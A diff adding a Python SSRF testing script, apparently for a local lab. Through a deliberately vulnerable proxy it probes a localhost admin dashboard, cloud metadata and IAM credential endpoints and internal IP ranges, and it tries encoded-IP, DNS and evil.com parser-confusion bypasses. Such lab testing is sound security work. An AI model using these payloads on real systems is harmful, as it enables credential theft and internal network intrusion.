@@ -1,0 +1,282 @@
+import requests
+import json
+import time
+
+class SSRF_Tester:
+    def __init__(self, proxy_url, target_urls=None):
+        self.proxy_url = proxy_url  # The vulnerable proxy endpoint
+        self.target_urls = target_urls or []
+        self.results = []
+    
+    def test_local_dashboard(self):
+        """Test accessing local dashboard through the vulnerable proxy"""
+        print("\n🔍 Testing Local Dashboard Access via SSRF...")
+        
+        # Test accessing the local dashboard running on port 80
+        local_targets = [
+            'http://localhost:80/',           # Dashboard home
+            'http://localhost:80/admin',      # Admin endpoint
+            'http://localhost:80/api/data',   # API endpoint
+            'http://127.0.0.1:80/',           # Alternative localhost
+            'http://0.0.0.0:80/',             # All interfaces
+        ]
+        
+        for target_url in local_targets:
+            try:
+                test_url = f"{self.proxy_url}?url={target_url}"
+                print(f"Testing: {test_url}")
+                
+                response = requests.get(test_url, timeout=5)
+                
+                # Check if we successfully accessed the dashboard
+                success_indicators = [
+                    'Admin Dashboard',
+                    'System Statistics',
+                    'Active Users',
+                    'status',
+                    'success'
+                ]
+                
+                is_success = any(indicator in response.text for indicator in success_indicators)
+                
+                self.results.append({
+                    'test_case': f"Access {target_url}",
+                    'status_code': response.status_code,
+                    'response_length': len(response.text),
+                    'success': is_success,
+                    'vulnerable': is_success,
+                    'preview': response.text[:100] + "..." if len(response.text) > 100 else response.text
+                })
+                
+                if is_success:
+                    print(f"✅ SUCCESS: Accessed {target_url}")
+                else:
+                    print(f"❌ FAILED: Could not access {target_url}")
+                    
+            except Exception as e:
+                print(f"❌ ERROR: {target_url} - {str(e)}")
+                self.results.append({
+                    'test_case': f"Access {target_url}",
+                    'error': str(e),
+                    'vulnerable': False
+                })
+    
+    def test_metadata_services(self):
+        """Test cloud metadata services"""
+        print("\n🔍 Testing Cloud Metadata Services...")
+        
+        metadata_targets = [
+            'http://169.254.169.254/latest/meta-data/',          # AWS
+            'http://169.254.169.254/latest/user-data/',          # AWS user data
+            'http://169.254.169.254/latest/meta-data/iam/',      # AWS IAM
+            'http://169.254.169.254/latest/meta-data/security-credentials/', # AWS credentials
+            'http://metadata.google.internal/',                  # GCP
+            'http://169.254.169.254/metadata/instance',          # Azure
+            'http://100.100.100.200/latest/meta-data/',          # Alibaba Cloud
+        ]
+        
+        for target_url in metadata_targets:
+            try:
+                test_url = f"{self.proxy_url}?url={target_url}"
+                print(f"Testing: {target_url}")
+                
+                response = requests.get(test_url, timeout=3)
+                
+                # Metadata services often return specific patterns
+                metadata_indicators = [
+                    'instance-id',
+                    'ami-id',
+                    'hostname',
+                    'local-ipv4',
+                    'public-keys',
+                    'security-groups',
+                    'availability-zone'
+                ]
+                
+                is_metadata = any(indicator in response.text.lower() for indicator in metadata_indicators)
+                is_success = response.status_code == 200 and len(response.text) > 0
+                
+                self.results.append({
+                    'test_case': f"Metadata: {target_url}",
+                    'status_code': response.status_code,
+                    'response_length': len(response.text),
+                    'success': is_success,
+                    'vulnerable': is_metadata,
+                    'preview': response.text[:100] + "..." if len(response.text) > 100 else response.text
+                })
+                
+                if is_metadata:
+                    print(f"✅ METADATA FOUND: {target_url}")
+                elif is_success:
+                    print(f"⚠️  ACCESSIBLE: {target_url} (but may not be metadata)")
+                else:
+                    print(f"❌ INACCESSIBLE: {target_url}")
+                    
+            except Exception as e:
+                print(f"❌ ERROR: {target_url} - {str(e)}")
+                self.results.append({
+                    'test_case': f"Metadata: {target_url}",
+                    'error': str(e),
+                    'vulnerable': False
+                })
+    
+    def test_internal_network(self):
+        """Test internal network scanning"""
+        print("\n🔍 Testing Internal Network Scanning...")
+        
+        # Common internal IP ranges
+        base_ips = ['192.168.1', '10.0.0', '172.16.0', '192.168.0']
+        common_ports = [80, 443, 22, 8080, 8000]
+        
+        # Test common internal services
+        internal_targets = []
+        for base_ip in base_ips:
+            for i in range(1, 3):  # Test first few IPs
+                for port in common_ports[:2]:  # Test first few ports
+                    internal_targets.append(f"http://{base_ip}.{i}:{port}/")
+        
+        for target_url in internal_targets[:10]:  # Limit to first 10 for demo
+            try:
+                test_url = f"{self.proxy_url}?url={target_url}"
+                print(f"Testing: {target_url}")
+                
+                response = requests.get(test_url, timeout=2)
+                
+                is_success = response.status_code == 200
+                
+                self.results.append({
+                    'test_case': f"Internal: {target_url}",
+                    'status_code': response.status_code,
+                    'success': is_success,
+                    'vulnerable': is_success,
+                    'preview': f"Status: {response.status_code}, Length: {len(response.text)}"
+                })
+                
+                if is_success:
+                    print(f"✅ INTERNAL SERVICE FOUND: {target_url}")
+                else:
+                    print(f"❌ No service at: {target_url}")
+                    
+            except Exception as e:
+                # Timeouts/errors are expected for non-existent services
+                self.results.append({
+                    'test_case': f"Internal: {target_url}",
+                    'error': str(e),
+                    'vulnerable': False
+                })
+    
+    def test_bypass_techniques(self):
+        """Test various SSRF bypass techniques"""
+        print("\n🔍 Testing SSRF Bypass Techniques...")
+        
+        bypass_tests = [
+            # Different localhost representations
+            'http://127.0.0.1:80/',
+            'http://0177.0.0.1:80/',           # Octal
+            'http://0x7f.0.0.1:80/',           # Hexadecimal
+            'http://2130706433:80/',           # Decimal
+            'http://127.1:80/',                # Shortened
+            'http://[::1]:80/',                # IPv6
+            'http://[::]:80/',                 # IPv6 all zeros
+            
+            # DNS tricks
+            'http://localhost.:80/',
+            'http://127.0.0.1.nip.io:80/',
+            'http://localtest.me:80/',
+            'http://subdomain.localhost:80/',
+            
+            # URL parser confusion
+            'http://127.0.0.1@evil.com:80/',
+            'http://evil.com@127.0.0.1:80/',
+            'http://127.0.0.1#@evil.com:80/',
+            'http://127.0.0.1?@evil.com:80/',
+        ]
+        
+        for target_url in bypass_tests:
+            try:
+                test_url = f"{self.proxy_url}?url={target_url}"
+                print(f"Testing bypass: {target_url}")
+                
+                response = requests.get(test_url, timeout=3)
+                
+                # Check for dashboard indicators
+                success_indicators = ['Admin Dashboard', 'System Statistics', 'status', 'success']
+                is_success = any(indicator in response.text for indicator in success_indicators)
+                
+                self.results.append({
+                    'test_case': f"Bypass: {target_url}",
+                    'status_code': response.status_code,
+                    'success': is_success,
+                    'vulnerable': is_success,
+                    'preview': response.text[:100] + "..." if len(response.text) > 100 else response.text
+                })
+                
+                if is_success:
+                    print(f"✅ BYPASS SUCCESS: {target_url}")
+                else:
+                    print(f"❌ Bypass failed: {target_url}")
+                    
+            except Exception as e:
+                print(f"❌ ERROR: {target_url} - {str(e)}")
+                self.results.append({
+                    'test_case': f"Bypass: {target_url}",
+                    'error': str(e),
+                    'vulnerable': False
+                })
+    
+    def generate_report(self):
+        """Generate comprehensive test report"""
+        vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
+        success_count = sum(1 for r in self.results if r.get('success', False))
+        
+        print("\n" + "="*60)
+        print("🎯 SSRF TEST REPORT")
+        print("="*60)
+        print(f"Target Proxy: {self.proxy_url}")
+        print(f"Total tests: {len(self.results)}")
+        print(f"Successful accesses: {success_count}")
+        print(f"Vulnerable endpoints: {vulnerable_count}")
+        print("\n📋 DETAILED RESULTS:")
+        print("-"*60)
+        
+        for result in self.results:
+            status = "✅ VULNERABLE" if result.get('vulnerable') else "❌ SAFE"
+            if result.get('success') and not result.get('vulnerable'):
+                status = "⚠️  ACCESSIBLE"
+            
+            print(f"{status}: {result['test_case']}")
+            if 'status_code' in result:
+                print(f"   Status: {result['status_code']}, Length: {result.get('response_length', 'N/A')}")
+            if 'preview' in result:
+                print(f"   Preview: {result['preview']}")
+            if 'error' in result:
+                print(f"   Error: {result['error']}")
+            print()
+
+def main():
+    # Test against the vulnerable proxy
+    tester = SSRF_Tester('http://localhost:5000/get')
+    
+    print("🚀 Starting SSRF Attack Simulation...")
+    print("Note: Make sure both apps are running:")
+    print("  - Vulnerable Proxy: python app.py (port 5000)")
+    print("  - Local Dashboard: python localhashboard.py (port 80)")
+    print()
+    
+    # Run all tests
+    tester.test_local_dashboard()
+    time.sleep(1)
+    
+    tester.test_metadata_services()
+    time.sleep(1)
+    
+    tester.test_internal_network()
+    time.sleep(1)
+    
+    tester.test_bypass_techniques()
+    
+    # Generate final report
+    tester.generate_report()
+
+if __name__ == '__main__':
+    main()
